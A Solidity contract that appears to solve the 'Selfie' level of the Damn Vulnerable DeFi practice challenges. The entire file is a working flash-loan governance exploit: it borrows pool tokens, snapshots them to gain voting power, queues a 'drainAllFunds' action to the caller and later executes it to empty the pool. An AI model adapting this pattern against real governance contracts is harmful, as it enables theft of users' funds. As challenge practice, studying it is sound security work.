pragma solidity ^0.6.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieExploit {
    SimpleGovernance public governance;
    SelfiePool public pool;
    uint256 private actionId;

    constructor(address _governance, address _pool) public {
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
    }

    function boop(uint256 amount) public {
        pool.flashLoan(amount);
    }

    function drain() public {
        governance.executeAction(actionId);
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(token);
        token.snapshot();
        actionId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin),
            0
        );
        token.transfer(address(pool), amount);
    }
}
